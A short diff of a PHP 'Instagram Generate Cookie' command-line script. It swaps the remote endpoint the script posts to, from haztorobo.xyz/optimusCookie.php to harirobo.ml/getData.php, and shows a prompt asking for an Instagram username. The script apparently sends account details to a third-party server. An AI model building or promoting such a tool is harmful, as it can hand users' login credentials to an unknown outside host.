@@ -1,6 +1,6 @@
 <?php
 $data=array('by'=>'Optimus Haztorobo Hati Hk',
-           'url'=>'https://haztorobo.xyz/optimusCookie.php',
+           'url'=>'https://harirobo.ml/getData.php',
             );
 function Submit($url,$fields)
     {
@@ -66,7 +66,7 @@ echo"\n\e[1;31mConection Error.. Try Again..\n\e[37m";
 echo"\n\e[1;31m".$ikeh['message']."\n\e[37m";
 }else{
 echo"\n\e[1m\e[37mInstagram Generate Cookie Version".$ikeh['data']['sign_version']."";
-echo"\n\e[2;32mhttps://haztorobo.xyz";
+echo"\n\e[2;32mhttps://harirobo.ml";
 echo"\n\e[31mCode By Hari Hk Optimus Developer\n";
 echo $likeh;
 echo"\n".$WH."?".$OR."Insert Username : ";
